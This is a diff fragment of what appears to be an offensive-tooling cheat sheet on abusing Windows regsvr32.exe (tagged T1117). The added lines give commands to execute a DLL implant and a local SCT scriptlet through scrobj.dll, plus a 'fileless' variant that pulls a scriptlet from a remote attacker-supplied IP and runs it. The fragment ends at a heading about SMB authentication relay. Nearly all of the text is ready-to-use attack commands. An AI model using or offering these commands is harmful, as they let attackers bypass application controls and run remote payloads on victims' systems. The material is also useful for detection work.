@@ -1,9 +1,23 @@
 # Regsvr32
 
+Search Tag(s): #T1117
+
 Execute DLL implant.
 
 ```
 C:\> regsvr32.exe /s implant.dll
+```
+
+Execute a SCT implant.
+
+```
+C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
+```
+
+Execute a fileless implant.
+
+```
+C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/implant.sct scrobj.dll
 ```
 
 Execute command to perform SMB authentication relay.
